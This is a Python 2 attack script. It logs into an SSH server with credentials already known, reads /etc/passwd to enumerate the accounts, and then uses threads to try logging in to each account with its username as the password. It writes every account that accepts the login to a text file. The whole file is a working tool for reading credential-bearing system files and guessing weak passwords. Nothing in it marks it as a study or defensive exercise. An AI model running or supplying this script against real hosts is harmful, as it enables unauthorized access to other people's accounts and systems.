# This script takes the ip adress of an ssh server
#  connects with known credentials and parses the names of users from /etc/passwd
# write the usernames:passwords to user_passwords_file.txt

import pexpect
import pxssh
import optparse
import os
import time
from threading import *

maxConnections = 20
connection_lock = BoundedSemaphore(value=maxConnections)

user_passwords = []

def original_connect(host, user, password):
	
	for i in range(1,10):
		try:
			print 'Connection attempt number ' + str(i) + '\n'
			s = pxssh.pxssh()
			s.login(host, user, password)
			print 'Connection Successful\n'
			return s
		except:
			pass


def test_connect(host, user, password, release):

	global user_passwords
	
	for i in range(1,10):
		try:
			print 'Connection for ' + user + ' attempt number ' + str(i) + '\n'
			s = pxssh.pxssh()
			s.login(host, user, password)
			print '[+] adding ' + user + ' to user_passwords list\n'
			user_passwords.append(user)
			user_passwords_file = open('user_passwords_file.txt', 'a')
			user_passwords_file.write(user + '\n')
			
			break

		except Exception, e:
			if 'password refused' in str(e):
				break
			else:
				pass

	if release:
		connection_lock.release()

def send_command(session, cmd):

	session.sendline(cmd)
	session.prompt()
	return session.before

def parse_users(output):
	users = []
	i = 33
	while 1:
		line = output.split('\r\n')[i]		
		if not line:
			break
		users.append(line)
		i = i + 1
	usernames = []
	for obj in users:
		name = obj.split(':')[0]
		usernames.append(name)
	return usernames

def main():

	parser = optparse.OptionParser('usage prog -h <target host> -u <user> -p <password>')
	parser.add_option('-H', dest='tgthost', type='string', help='specify target host')
	parser.add_option('-u', dest='user', type='string', help='enter known username')
	parser.add_option('-p', dest='password', type='string', help='enter corresponding password')
	(options, args) = parser.parse_args()
	
	host = options.tgthost
	usr = options.user
	pswd = options.password

	if host == None or usr == None or pswd == None:
		print parser.usage
		exit(0)

	print 'Original Connection Attempt :\n'	
	session = original_connect(host, usr, pswd)  # We connect to the known credentials ssh session
	time.sleep(2)

	# now we need to execute the python script that parses the usernames from /etc/passwd
	# and return the results to this script so it continues

	command = "cat /etc/passwd"	
	output = send_command(session, command)	 # sending the command to display the passwd file

	usernames = parse_users(output)	
	print usernames

	for user in usernames:	
		connection_lock.acquire()
		#print 'Connection for ' + user + ' Attempt:'
		t = Thread(target=test_connect, args=(host, user, user, True)) 
		child = t.start()													  

	print user_passwords	# print a list of all the usernames/passwords that succeeded


if __name__ == '__main__':
	main()



	


